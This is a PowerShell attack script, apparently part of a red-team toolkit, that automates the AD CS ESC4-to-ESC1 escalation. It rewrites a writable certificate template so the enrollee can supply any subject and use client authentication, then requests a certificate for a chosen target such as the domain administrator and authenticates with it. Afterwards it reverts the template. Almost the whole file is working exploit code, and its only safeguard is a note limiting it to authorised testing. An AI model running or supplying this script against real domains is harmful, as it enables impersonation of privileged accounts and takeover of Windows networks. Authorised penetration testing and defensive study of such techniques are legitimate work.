<#
.SYNOPSIS
    AD CS ESC4 - Template ACL Abuse -> ESC1 Chain (LOLBAS).
.DESCRIPTION
    Modifies a writable certificate template to enable ENROLLEE_SUPPLIES_SUBJECT
    and Client Auth EKU, then chains to ESC1 exploitation. Reverts template on cleanup.
.PARAMETER CAConfig
    CA configuration string (e.g., "polaris.zsec.red\corp-DC01-CA")
.PARAMETER TemplateName
    Template you have GenericWrite/WriteDacl/GenericAll over
.PARAMETER TargetUPN
    UPN of the user to impersonate
.EXAMPLE
    .\Invoke-ESC4.ps1 -CAConfig "polaris.zsec.red\corp-CA" -TemplateName "WritableTemplate" -TargetUPN "administrator@zsec.red"
.NOTES
    For authorised security testing and educational purposes only.
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory)] [string]$CAConfig,
    [Parameter(Mandatory)] [string]$TemplateName,
    [Parameter(Mandatory)] [string]$TargetUPN,

    [string]$PFXPassword,
    [string]$OutputDir = "$env:TEMP\adcs-ops",
    [ValidateSet('Schannel','PKINIT','Both')] [string]$AuthMethod = 'Both',
    [string]$DCTarget,
    [switch]$SkipAuth,
    [switch]$SkipCleanup
)

$ErrorActionPreference = 'Stop'
if (-not $PFXPassword) { $PFXPassword = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 20 | ForEach-Object { [char]$_ }) }
if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null }

$_dir = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Definition }
. "$_dir\adcs-common.ps1"

Write-Host ""
Write-Host "  AD CS LOLBAS - ESC4 Standalone" -ForegroundColor White
Write-Host "  --------------------------------" -ForegroundColor DarkGray
Write-Host ""

Write-Banner "ESC4" "Template ACL Abuse -> ESC1 Chain"

$ctx = Get-ADContext
$templateDN = "CN=$TemplateName,$($ctx.TemplateBase)"

Write-Stage -Number 1 -Name "RECONNAISSANCE"
$original = Get-ADObject -Identity $templateDN -Properties `
    'msPKI-Certificate-Name-Flag','msPKI-Enrollment-Flag','msPKI-RA-Signature','pKIExtendedKeyUsage'
Write-Host "    [>] Original NameFlag   : $($original.'msPKI-Certificate-Name-Flag')" -ForegroundColor Gray
Write-Host "    [>] Original EnrollFlag : $($original.'msPKI-Enrollment-Flag')" -ForegroundColor Gray
Write-Host "    [>] Original RA-Sig     : $($original.'msPKI-RA-Signature')" -ForegroundColor Gray
Write-Host "    [>] Original EKUs       : $($original.'pKIExtendedKeyUsage' -join ', ')" -ForegroundColor Gray
Write-Stage -Number 1 -Name "RECONNAISSANCE" -Status 'COMPLETE'

# STAGE 2: MODIFY TEMPLATE
Write-Host ""
Write-Stage -Number 2 -Name "POSITIONING - Modifying Template"
Write-Host "    [>] Enabling ENROLLEE_SUPPLIES_SUBJECT" -ForegroundColor Yellow
Write-Host "    [>] Setting Client Auth EKU" -ForegroundColor Yellow
Write-Host "    [>] Removing approval + signature requirements" -ForegroundColor Yellow

Set-ADObject -Identity $templateDN -Replace @{
    'msPKI-Certificate-Name-Flag' = 1
    'msPKI-Enrollment-Flag'       = 0
    'msPKI-RA-Signature'          = 0
    'pKIExtendedKeyUsage'         = @("1.3.6.1.5.5.7.3.2")
}
Write-Host "    [+] Template modified" -ForegroundColor Green
Write-Host "    [>] Waiting for AD replication..." -ForegroundColor Gray
Start-Sleep -Seconds 5
Write-Stage -Number 2 -Name "POSITIONING" -Status 'COMPLETE'

# STAGE 3: REQUEST (as ESC1)
Write-Host ""
Write-Stage -Number 3 -Name "CERTIFICATE REQUEST (as ESC1)"
$inf = New-CertRequestINF -Subject "CN=$env:USERNAME" -SAN "upn=$TargetUPN&" `
    -Template $TemplateName -OutFile "$OutputDir\esc4.inf" -Exportable
$result = Invoke-CertRequest -INFFile $inf -CA $CAConfig -Prefix "esc4"
if (-not $result.Success) { Write-Stage -Number 3 -Name "CERTIFICATE REQUEST" -Status 'FAILED' }
else { Write-Stage -Number 3 -Name "CERTIFICATE REQUEST" -Status 'COMPLETE' }

# STAGE 4: VERIFY
if ($result.Success) {
    Write-Host ""
    Write-Stage -Number 4 -Name "CERTIFICATE VERIFICATION"
    $certDump = certutil -dump $result.CerFile 2>$null
    $sanLine = $certDump | Select-String 'Principal Name=' | Select-Object -First 1
    if ($sanLine) { Write-Host "    [+] SAN: $($sanLine.Line.Trim())" -ForegroundColor Green }
    Write-Stage -Number 4 -Name "CERTIFICATE VERIFICATION" -Status 'COMPLETE'
}

# STAGE 5: AUTHENTICATE
if ($result.Success) {
    Invoke-AuthStage -PFXFile $result.PFXFile -PFXPass $PFXPassword -DC $DCTarget
}

# STAGE 6: CLEANUP - revert template
if (-not $SkipCleanup) {
    Write-Host ""
    Write-Stage -Number 6 -Name "CLEANUP - Reverting Template"
    $revertProps = @{
        'msPKI-Certificate-Name-Flag' = $original.'msPKI-Certificate-Name-Flag'
        'msPKI-Enrollment-Flag'       = $original.'msPKI-Enrollment-Flag'
        'msPKI-RA-Signature'          = $original.'msPKI-RA-Signature'
    }
    if ($original.'pKIExtendedKeyUsage') {
        $revertProps['pKIExtendedKeyUsage'] = $original.'pKIExtendedKeyUsage'
    }
    Set-ADObject -Identity $templateDN -Replace $revertProps
    Write-Host "    [+] Template reverted to original configuration" -ForegroundColor Green
    Write-Stage -Number 6 -Name "CLEANUP" -Status 'COMPLETE'
} else {
    Write-Host ""
    Write-Stage -Number 6 -Name "CLEANUP" -Status 'SKIPPED'
    Write-Host "    [!] Template is STILL MODIFIED - revert manually!" -ForegroundColor Red
}

Write-Host ""
Write-Host "  Complete. Artifacts in: $OutputDir" -ForegroundColor Gray
Write-Host ""
